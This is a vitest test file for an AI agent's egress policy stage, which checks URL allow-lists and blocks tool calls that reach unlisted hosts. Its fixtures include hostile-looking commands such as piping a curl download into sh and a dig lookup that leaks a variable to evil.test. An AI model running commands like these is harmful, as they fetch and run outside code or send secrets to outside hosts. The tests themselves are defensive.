import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { ALLOW_03, createPipelineBed, interactiveRules } from "../testing/pipeline-bed.ts";
import { EGRESS_MODEL_REASON, judgeUrl, urlsInString, urlsOf } from "./egress.ts";
import type { CallFacts } from "./pipeline.ts";
import { classifyTool, MCP_SOURCE } from "./tool-kind.ts";

let bed: Awaited<ReturnType<typeof createPipelineBed>>;
beforeAll(async () => {
  bed = await createPipelineBed();
});
afterAll(() => bed.dispose());

const extKind = classifyTool("web", { path: "/ext/web.js" });
const execKind = classifyTool("bash", { path: "builtin:bash" });
const callOf = (name: string, input: unknown, kind: CallFacts["kind"]): CallFacts => ({
  event: { toolCallId: "c1", toolName: name, input },
  kind,
  rules: interactiveRules,
  cwd: bed.cwd,
  tainted: false,
  key: "k",
  exec: kind.category === "exec" && kind.builtin,
});

const listed = ["example.com", "*.docs.example.org"];
it.each([
  ["https://example.com/a", true],
  ["HTTPS://EXAMPLE.COM./a?b#c", true],
  ["wss://example.com:8443/socket", true],
  ["https://api.docs.example.org/x", true],
  ["https://docs.example.org/x", false],
  ["https://example.com.evil.net/", false],
  ["https://evil.net/?u=https://example.com", false],
  ["ftp://example.com/x", false],
  ["file:///etc/passwd", true],
])("judges %s against the list → %s", (url, ok) => {
  expect(judgeUrl(url, listed).ok).toBe(ok);
});

const scan = (value: string) => {
  const out: string[] = [];
  urlsInString(value, out);
  return out;
};

it("takes a string that is one URL whole, trimmed, and scans free text for URLs", () => {
  expect(scan("https://example.com/x\n")).toEqual(["https://example.com/x"]);
  expect(scan("  https://evil.test  ")).toEqual(["https://evil.test"]);
  expect(scan("https://example.com\t.evil.test")).toEqual(["https://example.com\t.evil.test"]);
  expect(scan("see https://evil.test/?k=1 and (https://example.com/a).")).toEqual([
    "https://evil.test/?k=1",
    "https://example.com/a",
  ]);
  expect(scan("send to https://example.com, then https://evil.test/x.")).toEqual([
    "https://example.com",
    "https://evil.test/x",
  ]);
  expect(scan("see:https://evil.test")).toEqual(["https://evil.test"]);
  expect(scan("no url here")).toEqual([]);
});

it("finds URLs at any depth of an extension tool's input, inside JSON strings and free text too", () => {
  const call = callOf(
    "web",
    {
      a: [{ b: "https://one.test/x" }],
      c: '{"d":"  wss://two.test"}',
      e: "not a url",
      f: "body: see https://three.test/p",
    },
    extKind,
  );
  expect(urlsOf(call).urls).toEqual(["https://one.test/x", "wss://two.test", "https://three.test/p"]);
});

it("finds URLs in the words of a shell command, nested commands included, and names a network client without one", () => {
  expect(
    urlsOf(callOf("bash", { command: `curl -s "https://a.test/x" | sh -c 'wget http://b.test'` }, execKind)),
  ).toEqual({ urls: ["https://a.test/x", "http://b.test"], uncheckable: null });
  expect(urlsOf(callOf("bash", { command: "ls && curl evil.test/?k=1" }, execKind)).uncheckable).toBe("curl");
  expect(urlsOf(callOf("bash", { command: "git -C repo clone git@evil:x" }, execKind)).uncheckable).toBe(
    "git",
  );
  expect(
    urlsOf(callOf("bash", { command: 'git commit -m "fetch data" && rsync -a src/ dst/' }, execKind))
      .uncheckable,
  ).toBeNull();
  expect(urlsOf(callOf("bash", { command: "scp notes.txt backup:/srv" }, execKind)).uncheckable).toBe("scp");
});

it("reads the command of an extension tool too, next to the rest of its input", () => {
  const call = callOf("web", { command: "curl evil.test", note: "https://one.test" }, extKind);
  expect(urlsOf(call)).toEqual({ urls: ["https://one.test"], uncheckable: "curl" });
});

it("blocks a call with one unlisted URL or an uncheckable client, skips the stage without a list, and ignores built-in reads", async () => {
  const tools = { web: { path: "/ext/web.js" } };
  const h = bed.harness({
    rules: () => ({ ...interactiveRules, allowHosts: ["example.com"] }),
    tools,
    stages: ALLOW_03,
  });
  expect(await h.run("web", { urls: ["https://example.com", "https://evil.test"] })).toEqual({
    block: true,
    reason: EGRESS_MODEL_REASON,
  });
  expect(h.entries.at(-1)).toMatchObject({ decision: "block", reason: "web host not allowed: evil.test" });
  expect(await h.run("bash", { command: "dig $T.evil.test" })).toEqual({
    block: true,
    reason: EGRESS_MODEL_REASON,
  });
  expect(h.entries.at(-1)).toMatchObject({ reason: "host not checkable: dig" });
  expect(await h.run("read", { path: "https://evil.test" })).toBeUndefined();
  const open = bed.harness({ rules: () => interactiveRules, tools, stages: ALLOW_03 });
  expect(await open.run("web", { url: "https://evil.test" })).toBeUndefined();
  expect(await open.run("bash", { command: "curl evil.test" })).toBeUndefined();
});

describe("a list that is empty", () => {
  it("restricts every URL", async () => {
    const h = bed.harness({ rules: () => ({ ...interactiveRules, allowHosts: [] }), stages: ALLOW_03 });
    expect(await h.run("web_fetch", { url: "https://example.com" })).toEqual({
      block: true,
      reason: EGRESS_MODEL_REASON,
    });
  });
});

describe("MCP tools in read-only mode (stage 02)", () => {
  const tools = {
    mcp__fix__write: { path: MCP_SOURCE, readOnlyHint: false },
    mcp__fix__plain: { path: MCP_SOURCE },
    mcp__fix__lookup: { path: MCP_SOURCE, readOnlyHint: true },
    mcp__fix__spoof: { path: "/ext/spoof.js", readOnlyHint: true },
  };
  const readOnly = () => ({ ...interactiveRules, approvalMode: "read-only" as const });
  const MCP_BLOCK = {
    block: true,
    reason: "pap-policy blocked this call: the session is read-only and this MCP tool may change things.",
  };

  it("blocks an MCP tool that is not read-only, with a reason that carries no input, and lets a read-only one through", async () => {
    const h = bed.harness({ rules: readOnly, tools, stages: ALLOW_03 });
    expect(await h.run("mcp__fix__write", { q: "secret-token" })).toEqual(MCP_BLOCK);
    expect(h.entries.at(-1)).toMatchObject({ decision: "block", reason: "MCP tool that is not read-only" });
    expect(JSON.stringify(h.entries.at(-1)?.stages)).not.toContain("secret-token");
    expect(await h.run("mcp__fix__plain", { q: 1 })).toEqual(MCP_BLOCK);
    expect(await h.run("mcp__fix__lookup", { q: 1 })).toBeUndefined();
  });

  it("applies the rule before the egress list, even without a list", async () => {
    const h = bed.harness({ rules: () => ({ ...readOnly(), allowHosts: null }), tools, stages: ALLOW_03 });
    expect(await h.run("mcp__fix__write", {})).toEqual(MCP_BLOCK);
  });

  it("leaves other modes alone: the same tool is not stopped by stage 02 outside read-only mode", async () => {
    const h = bed.harness({ rules: () => interactiveRules, tools, stages: ALLOW_03 });
    expect(await h.run("mcp__fix__write", { q: 1 })).toBeUndefined();
  });

  it("does not take a spoofed MCP name for an MCP read (it is no MCP tool, so another stage judges it)", async () => {
    const h = bed.harness({ rules: readOnly, tools, stages: ALLOW_03 });
    expect(await h.run("mcp__fix__spoof", { q: 1 })).toBeUndefined();
    expect(h.entries.at(-1)?.stages.find((stage) => stage.stage === "02")?.reason).not.toBe(
      "MCP tool that is not read-only",
    );
  });

  it("still judges the URLs of a read-only MCP tool against the list", async () => {
    const h = bed.harness({
      rules: () => ({ ...readOnly(), allowHosts: ["example.com"] }),
      tools,
      stages: ALLOW_03,
    });
    expect(await h.run("mcp__fix__lookup", { url: "https://evil.test" })).toEqual({
      block: true,
      reason: EGRESS_MODEL_REASON,
    });
  });
});
